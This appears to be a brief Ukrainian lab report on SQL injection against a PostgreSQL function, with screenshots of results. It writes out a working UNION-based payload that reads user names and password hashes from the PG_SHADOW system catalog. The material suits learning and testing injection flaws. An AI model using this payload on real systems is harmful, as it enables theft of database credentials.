1. SQL-ін'єкція підкласу "Зняття фільтрації рідків умови SQL-запиту":
    <p><img width="321" alt="image" src="https://user-images.githubusercontent.com/52915030/206472057-fd695f8b-4443-4dcb-b37d-150bc1f6cb37.png"> </p>
2. SQL-ін'єкція підкласу "Отримання вмісту таблиць, що не входять у SQL- запит"
    <p> select * from get_data('1'' UNION SELECT CAST(usesysid as integer), CAST(USENAME as varchar), CAST(PASSWD as integer) FROM PG_SHADOW -- '); </p> <p> <img width="707" alt="image" src="https://user-images.githubusercontent.com/52915030/206477417-1c448160-a123-4603-aefd-e6657acd93e7.png">
 </p> 
 <p> <img width="429" alt="image" src="https://user-images.githubusercontent.com/52915030/206478148-ab3a67e4-a620-4a70-82c0-483bed20ab0d.png">
 </p>
